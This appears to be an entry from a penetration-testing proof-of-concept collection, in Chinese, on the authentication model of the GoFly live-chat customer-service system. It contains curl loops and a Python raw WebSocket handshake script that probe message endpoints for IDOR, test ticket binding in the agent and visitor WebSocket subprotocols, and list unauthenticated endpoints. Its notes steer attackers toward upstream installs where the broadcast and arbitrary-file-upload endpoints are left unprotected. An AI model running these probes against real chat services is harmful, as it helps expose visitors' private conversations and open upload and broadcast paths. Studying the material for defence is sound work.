# GoFly 客服系统鉴权模型与越权判定（/2/ 族 401vs403 判据 + ws_kefu/ws_visitor 子协议票据）

- **code**: gofly-客服系统鉴权模型与越权判定-2-族-401vs403-判据-ws_kefu-ws_visitor-子协议票据
- **kind**: script
- **category**: unauthorized
- **component**: GoFly / goflylivechat（taoshihan1991）及二开版
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-12 在 example.com（源站 203.0.113.95）实测：/2/messagesPages 带正确 supportToken + 自己 visitor_id → 200（count=196 真实记录）；同 token 换同 uid 错 username / 加后缀 / 不存在 id → 403；无票 → 401；伪造票（全 0 签名 / 无签名段 / 篡改 userId）→ 401；ws_visitor 自己 id+正确票据 → 101，错 username/不存在 id/空 token/无子协议 → 401；ws_kefu 6 种子协议姿势全部 HTTP 200 + {"code":400,"msg":"token失效"}（无 101）；会员 JWT 当客服票用 → /visitors_kefu_online、/kefuinfo、/message_close 全 token失效。
- **path**: pocs/gofly-客服系统鉴权模型与越权判定-2-族-401vs403-判据-ws_kefu-ws_visitor-子协议票据/poc.sh
- **tags**: gofly,goflylivechat,websocket,子协议鉴权,IDOR,客服系统,未授权
- **created_at**: 2026-10-12T14:43:39.289Z
- **found_by**: exploit

## 描述

GoFly（goflylivechat）客服系统的鉴权模型与越权判定方法。三套鉴权：① 客服 JWT 走 HTTP `token:` 头或 WS 子协议 `auth.<jwt>`（ws_kefu 也用它，中间件在 upgrade 前拒绝 ⇒ 返回 HTTP 200 + {"code":400,"msg":"token失效"} 而非 401）；② 访客票据（base64(payload).HMAC-SHA256，payload 含 visitorId/userId/username/purpose/expiresAt）走 `Authorization: Bearer`，用于 /2/messagesPages、/2/messages、/2/message(POST)；③ 判据：401 {"code":401,"msg":"无权访问该客服会话"}=无票/票不可解析，403 同文案=票有效但与请求的 visitor_id 不匹配 ⇒ 只要出现 403，说明服务端做了身份绑定（无 IDOR），出现 200+别人数据才是越权。上游开源版 router/api.go 对 /2/messagesPages、/2/message、/2/message_close、/visitor_login、/message_notice（向全体访客广播）、/uploadfile（任意后缀）**都没有中间件**，是中招点；本靶标为私有二开版，这些面均已加门，只剩 /notice 未鉴权。

## 用法

```
1) 先把 Host 钉到真实 web root 的域名 + --resolve 到源站 IP（同一 IP 常有多套 web root，用错 Host 会全 404 造成假阴性）。2) 跑上面第 1 段，把 <VISITOR_TICKET> 换成自己的访客票据：自己 id→200、换成他人/不存在 id→403 即证明绑定成立（无 IDOR）。3) 第 2 段判 WS：ws_kefu 只有 101 才算进了客服面，返回 200+token失效 就是票不对；ws_visitor 的 401/101 分界就是绑定判据。4) 第 3 段清点未鉴权面，打上游开源版时优先看 /2/messagesPages、/message_notice、/uploadfile。
```

## 正文

```
#!/usr/bin/env python3
# GoFly 客服系统鉴权判定三件套（HTTP + WS），零副作用、只读
# 1) 判定 /2/ 族认哪种票据（401=无票/票错，403=票有效但与 visitor_id 不匹配 ⇒ 提权判据）
for H in token authorization; do
  curl -sS -k --resolve example.com:443:203.0.113.95 \
    -H "$H: Bearer <VISITOR_TICKET>" \
    "https://example.com/2/messagesPages?page=1&pagesize=3&visitor_id=<OWN_VISITOR_ID>"
done
curl -sS -k --resolve example.com:443:203.0.113.95 \
  "https://example.com/2/messagesPages?page=1&pagesize=3&visitor_id=<OTHER_VISITOR_ID>"   # 403 => 无 IDOR

# 2) WS 子协议鉴权（票在 Sec-WebSocket-Protocol 里，浏览器没法自定义头）
#    客服侧:  ["hch-admin", "auth."+token]       访客侧: ?visitor_id=<id>  + ["hch-support", ticket]
python3 - <<'PY'
import socket, ssl, base64, os
def hs(path, protos, host="example.com", ip="203.0.113.95"):
    key = base64.b64encode(os.urandom(16)).decode()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((ip,443),timeout=10), server_hostname=host)
    req = [f"GET {path} HTTP/1.1", f"Host: {host}", "Upgrade: websocket", "Connection: Upgrade",
           f"Sec-WebSocket-Key: {key}", "Sec-WebSocket-Version: 13",
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124"]
    if protos: req.append("Sec-WebSocket-Protocol: " + ", ".join(protos))
    s.sendall(("\r\n".join(req)+"\r\n\r\n").encode())
    buf=b""
    while b"\r\n\r\n" not in buf: buf += s.recv(4096)
    head, _, _ = buf.partition(b"\r\n\r\n")
    return head.decode("utf-8","replace").split("\r\n")[0]
print(hs("/ws_kefu", ["hch-admin","auth.<KEFU_JWT>"]))                       # 101 才是真客服票；其它=200+token失效
print(hs("/ws_visitor?visitor_id=<OWN>", ["hch-support","<VISITOR_TICKET>"])) # 101
print(hs("/ws_visitor?visitor_id=<OTHER>", ["hch-support","<VISITOR_TICKET>"]))# 401 => 票据与 id 精确绑定
PY

# 3) 未鉴权面清点（上游 GoFly 默认全是裸的，二开版可能已加门）
for p in /notice?kefu_id=agent /visitors_online /message_notice /visitor_login /uploadfile /uploadimg /about /config; do
  curl -sS -k -o /dev/null -w "$p %{http_code}\n" --resolve example.com:443:203.0.113.95 "https://example.com$p"
done
```
